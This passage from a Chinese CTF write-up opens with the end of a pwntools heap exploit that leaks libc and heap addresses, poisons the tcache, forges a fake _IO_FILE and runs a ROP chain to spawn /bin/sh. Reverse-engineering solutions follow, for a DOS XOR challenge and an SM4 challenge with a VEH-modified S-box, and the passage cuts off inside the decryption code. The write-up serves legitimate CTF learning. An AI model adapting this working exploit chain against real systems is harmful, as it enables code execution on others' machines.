<span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">)</span>
sla<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">view</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span> <span class="token string">"4"</span><span class="token punctuation">)</span>
sla<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span> <span class="token string">"3"</span><span class="token punctuation">)</span>
sla<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
sla<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">,</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    free<span class="token punctuation">(</span>i<span class="token punctuation">)</span>

add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">"A"</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">,</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x300</span><span class="token punctuation">,</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>

view<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
libc<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x203b00</span>
<span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc<span class="token punctuation">)</span>

view<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
heap<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x1200</span>
<span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>heap<span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token string">"/bin/sh\0"</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment">#7</span>
add<span class="token punctuation">(</span><span class="token number">0x101</span><span class="token punctuation">,</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x101</span><span class="token punctuation">,</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
free<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
free<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>

stdout<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x2045c0</span>
io_list_all<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x2044c0</span>
target<span class="token operator">=</span><span class="token punctuation">(</span>io_list_all<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>heap<span class="token operator">+</span><span class="token number">0x1060</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">12</span>
target1<span class="token operator">=</span><span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>heap<span class="token operator">+</span><span class="token number">0x1080</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">12</span>

p<span class="token operator">=</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>target<span class="token punctuation">)</span>
p<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x111</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>target1<span class="token punctuation">)</span>

fake_io_addr<span class="token operator">=</span>heap<span class="token operator">+</span><span class="token number">0xd20</span>

edit<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x101</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>fake_io_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

system<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x58750</span>
environ<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x20ad58</span>
_IO_wfile_jumps<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x202228</span>
setcontext<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x4a99d</span>

rop_addr<span class="token operator">=</span>heap<span class="token operator">+</span><span class="token number">0x850</span>
rax<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0xdd237</span>
rdi<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x158748</span>
rsi<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x02b46b</span>
syscall<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x127185</span><span class="token operator">+</span><span class="token number">4</span>
rsp<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x5ef6f</span>
rdx<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x162e3a</span>

rop<span class="token operator">=</span>p64<span class="token punctuation">(</span>rax<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span>
rop<span class="token operator">+=</span>p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">5</span>
rop<span class="token operator">+=</span>p64<span class="token punctuation">(</span>rsi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>
rop<span class="token operator">+=</span>p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span>

rop<span class="token operator">+=</span>p64<span class="token punctuation">(</span>rax<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span>
rop<span class="token operator">+=</span>p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">5</span>
rop<span class="token operator">+=</span>p64<span class="token punctuation">(</span>rsi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>
rop<span class="token operator">+=</span>p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span>

rop<span class="token operator">+=</span>p64<span class="token punctuation">(</span>rax<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x3b</span><span class="token punctuation">)</span>
rop<span class="token operator">+=</span>p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heap<span class="token operator">+</span><span class="token number">0xd20</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">5</span>
rop<span class="token operator">+=</span>p64<span class="token punctuation">(</span>rsi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heap<span class="token operator">+</span><span class="token number">0x978</span><span class="token operator">+</span><span class="token number">0x28</span><span class="token punctuation">)</span>
rop<span class="token operator">+=</span>p64<span class="token punctuation">(</span>rdx<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heap<span class="token operator">+</span><span class="token number">0x978</span><span class="token operator">+</span><span class="token number">0x28</span><span class="token punctuation">)</span>
rop<span class="token operator">+=</span>p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span>

edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> rop<span class="token punctuation">)</span>

fake_io <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
    <span class="token number">0x0</span><span class="token punctuation">:</span> <span class="token string">" sh;"</span><span class="token punctuation">,</span>
    <span class="token number">0x10</span><span class="token punctuation">:</span> p64<span class="token punctuation">(</span>setcontext<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token number">0x20</span><span class="token punctuation">:</span> p64<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token number">0x88</span><span class="token punctuation">:</span> p64<span class="token punctuation">(</span>rop_addr<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment"># _lock</span>
    <span class="token number">0xa0</span><span class="token punctuation">:</span> p64<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token number">0xa8</span><span class="token punctuation">:</span> p64<span class="token punctuation">(</span>rsp<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token number">0xd8</span><span class="token punctuation">:</span> p64<span class="token punctuation">(</span>_IO_wfile_jumps <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token number">0xe0</span><span class="token punctuation">:</span> p64<span class="token punctuation">(</span>stdout<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> filler<span class="token operator">=</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span>


add<span class="token punctuation">(</span><span class="token number">0x101</span><span class="token punctuation">,</span> fake_io<span class="token punctuation">)</span>
shell<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>



<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="ezDOS"><a href="#ezDOS" class="headerlink" title="ezDOS"></a>ezDOS</h3><p>程序中间出现的花指令都直接nop去除，然后Apply patch到程序。</p>
<p><img src="/images/1742731823755-b823cf34-aab4-4fbe-bf7e-f53a4aaa3497.png" loading="lazy"></p>
<p>程序要求输入38长度字符串，然后进行一系列变种类RC4算法加密，然后与0x141地址的38字节数据进行比对。</p>
<p><img src="/images/1742732096513-faa2f920-70f8-4a36-93df-91f224f7c6d0.png" loading="lazy"></p>
<p>使用dosbox动调，在FA代码处是对取出的al对输入的字符串进行xor加密。0x32是取出的异或值，0x31是输入的字符’1’。</p>
<p><img src="/images/1742732287881-3999c9b7-5e31-4121-9f55-e2b906e10ccd.png" loading="lazy"></p>
<p><img src="/images/1742732249120-5fda8d14-cb9b-4f49-8bf6-614e6960dc63.png" loading="lazy"></p>
<p>直接debug一直循环执行这边，即可拿到对输入字符串异或的一系列异或值。</p>
<blockquote>
<p>32 7d 59 7a f3 0d b3 7b 64 8c eb 28 c4 a4 50 30 a0 ed 27 6a e3 76 69 0c da 28 f8 08 ba a6 17 3e 12 59 45 06 4e f1</p>
</blockquote>
<p>取出0x142地址的38字节，进行异或即可得到解密flag。</p>
<p><img src="/images/1742732520225-ea38e755-4155-4ff4-b845-9fd37b9bcc95.png" loading="lazy"></p>
<h3 id="SafeProgram"><a href="#SafeProgram" class="headerlink" title="SafeProgram"></a>SafeProgram</h3><p>核心加密是一个SM4加密。</p>
<p><img src="/images/1742733064140-f984f029-5c19-40da-96a2-7c9933518e4b.png" loading="lazy"></p>
<p>查看byte_14002A0D0数组交叉引用，发现在其他函数被访问过。</p>
<p><img src="/images/1742733138431-04584683-08b6-44f7-a471-1549be8e206e.png" loading="lazy"></p>
<p><img src="/images/1742733148877-755426b6-0cd4-4c98-86b0-49efafd7b7e6.png" loading="lazy"></p>
<p>发现是在VEH异常Handler里面调用的，第一个AddVectoredExceptionHandler得直接nop，不然运行就直接退出。</p>
<p><img src="/images/1742733208272-ce5e8263-86f4-4503-8a09-968a5e694740.png" loading="lazy"></p>
<p><img src="/images/1742733215267-dd1e9a92-33aa-4250-a846-4191f12379b8.png" loading="lazy"></p>
<p><img src="/images/1742733314872-bc3290b8-a385-47a3-965d-5477921a25a5.png" loading="lazy"></p>
<p>然后在这个函数开头断点，使用ScyllaHide插件一键去除反调试，防止其他地方的反调试。</p>
<p><img src="/images/1742733356084-873e99b1-43f0-4c23-9c16-33ce6afc2a5b.png" loading="lazy"></p>
<p>main函数可以看到要求输入格式为NCTF{…}的长度38字符串，然后运行到箭头函数会触发除0异常，然后就会触发VEH那个Handler导致那个byte数组被修改，需要提取的数据是被改后的。</p>
<p><img src="/images/1742733443971-e0cf12c7-c12a-48b3-b557-7ff20d700ec6.png" loading="lazy"></p>
<p>动调时提取这三个数组数据，进行解密即可。</p>
<p><img src="/images/1742733627618-776e5556-677d-4108-957a-8081f3a182ad.png" loading="lazy"></p>
<p>key是main函数两次memcpy那边的数据，结果如下。</p>
<p><img src="/images/1742733798575-ba99240d-931c-4963-aecb-87467e43e57a.png" loading="lazy"></p>
<p>解密代码：</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;vector></span></span>

<span class="token keyword">unsigned</span> <span class="token keyword">char</span> byte_7FF699A4A0D0<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
<span class="token number">0xD1</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">0xE9</span><span class="token punctuation">,</span> <span class="token number">0xFE</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xE1</span><span class="token punctuation">,</span> <span class="token number">0x3D</span><span class="token punctuation">,</span> <span class="token number">0xB7</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">,</span> <span class="token number">0xB6</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">,</span> <span class="token number">0xC2</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token number">0xFB</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span>
<span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0x9A</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0xBE</span><span class="token punctuation">,</span> <span class="token number">0x04</span><span class="token punctuation">,</span> <span class="token number">0xC3</span><span class="token punctuation">,</span> <span class="token number">0xAA</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">,</span> <span class="token number">0x49</span><span class="token punctuation">,</span> <span class="token number">0x86</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0x99</span><span class="token punctuation">,</span>
<span class="token number">0x9C</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0xF4</span><span class="token punctuation">,</span> <span class="token number">0x91</span><span class="token punctuation">,</span> <span class="token number">0xEF</span><span class="token punctuation">,</span> <span class="token number">0x98</span><span class="token punctuation">,</span> <span class="token number">0x7A</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x0B</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0xED</span><span class="token punctuation">,</span> <span class="token number">0xCF</span><span class="token punctuation">,</span> <span class="token number">0xAC</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span>
<span class="token number">0xE4</span><span class="token punctuation">,</span> <span class="token number">0xB3</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0xA9</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0xDF</span><span class="token punctuation">,</span> <span class="token number">0x94</span><span class="token punctuation">,</span> <span class="token number">0xFA</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0x8F</span><span class="token punctuation">,</span> <span class="token number">0x3F</span><span class="token punctuation">,</span> <span class="token number">0xA6</span><span class="token punctuation">,</span>
<span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0x07</span><span class="token punctuation">,</span> <span class="token number">0xA7</span><span class="token punctuation">,</span> <span class="token number">0x4F</span><span class="token punctuation">,</span> <span class="token number">0xF3</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0xBA</span><span class="token punctuation">,</span> <span class="token number">0x83</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x19</span><span class="token punctuation">,</span> <span class="token number">0xE6</span><span class="token punctuation">,</span> <span class="token number">0x85</span><span class="token punctuation">,</span> <span class="token number">0xD6</span><span class="token punctuation">,</span> <span class="token number">0xA8</span><span class="token punctuation">,</span>
<span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x6B</span><span class="token punctuation">,</span> <span class="token number">0x81</span><span class="token punctuation">,</span> <span class="token number">0xB2</span><span class="token punctuation">,</span> <span class="token number">0xFC</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0xDA</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0xF8</span><span class="token punctuation">,</span> <span class="token number">0xEB</span><span class="token punctuation">,</span> <span class="token number">0x0F</span><span class="token punctuation">,</span> <span class="token number">0x4B</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x9D</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span>
<span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x0E</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0x9F</span><span class="token punctuation">,</span> <span class="token number">0xA2</span><span class="token punctuation">,</span> <span class="token number">0x25</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0xC9</span><span class="token punctuation">,</span> <span class="token number">0x87</span><span class="token punctuation">,</span>
<span class="token number">0xD4</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x46</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x5E</span><span class="token punctuation">,</span> <span class="token number">0xD3</span><span class="token punctuation">,</span> <span class="token number">0x27</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0xE7</span><span class="token punctuation">,</span> <span class="token number">0xA0</span><span class="token punctuation">,</span> <span class="token number">0xC4</span><span class="token punctuation">,</span> <span class="token number">0xC8</span><span class="token punctuation">,</span> <span class="token number">0x9E</span><span class="token punctuation">,</span>
<span class="token number">0xEA</span><span class="token punctuation">,</span> <span class="token number">0xBF</span><span class="token punctuation">,</span> <span class="token number">0x8A</span><span class="token punctuation">,</span> <span class="token number">0xD2</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0xC7</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0xB5</span><span class="token punctuation">,</span> <span class="token number">0xA3</span><span class="token punctuation">,</span> <span class="token number">0xF7</span><span class="token punctuation">,</span> <span class="token number">0xF2</span><span class="token punctuation">,</span> <span class="token number">0xCE</span><span class="token punctuation">,</span> <span class="token number">0xF9</span><span class="token punctuation">,</span> <span class="token number">0x61</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">,</span> <span class="token number">0xA1</span><span class="token punctuation">,</span>
<span class="token number">0xE0</span><span class="token punctuation">,</span> <span class="token number">0xAE</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0xA4</span><span class="token punctuation">,</span> <span class="token number">0x9B</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0xAD</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0xF5</span><span class="token punctuation">,</span> <span class="token number">0x8C</span><span class="token punctuation">,</span> <span class="token number">0xB1</span><span class="token punctuation">,</span> <span class="token number">0xE3</span><span class="token punctuation">,</span>
<span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0xF6</span><span class="token punctuation">,</span> <span class="token number">0xE2</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x82</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0xCA</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0xC0</span><span class="token punctuation">,</span> <span class="token number">0x29</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span> <span class="token number">0xAB</span><span class="token punctuation">,</span> <span class="token number">0x0D</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x4E</span><span class="token punctuation">,</span> <span class="token number">0x6F</span><span class="token punctuation">,</span>
<span class="token number">0xD5</span><span class="token punctuation">,</span> <span class="token number">0xDB</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0xDE</span><span class="token punctuation">,</span> <span class="token number">0xFD</span><span class="token punctuation">,</span> <span class="token number">0x8E</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0x6A</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x6C</span><span class="token punctuation">,</span> <span class="token number">0x5B</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span>
<span class="token number">0x8D</span><span class="token punctuation">,</span> <span class="token number">0x1B</span><span class="token punctuation">,</span> <span class="token number">0xAF</span><span class="token punctuation">,</span> <span class="token number">0x92</span><span class="token punctuation">,</span> <span class="token number">0xBB</span><span class="token punctuation">,</span> <span class="token number">0xDD</span><span class="token punctuation">,</span> <span class="token number">0xBC</span><span class="token punctuation">,</span> <span class="token number">0x7F</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0xD9</span><span class="token punctuation">,</span> <span class="token number">0x5C</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x1F</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x5A</span><span class="token punctuation">,</span> <span class="token number">0xD8</span><span class="token punctuation">,</span>
<span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0xC1</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0xA5</span><span class="token punctuation">,</span> <span class="token number">0xCD</span><span class="token punctuation">,</span> <span class="token number">0x7B</span><span class="token punctuation">,</span> <span class="token number">0xBD</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0xD0</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0xB8</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0xB4</span><span class="token punctuation">,</span> <span class="token number">0xB0</span><span class="token punctuation">,</span>
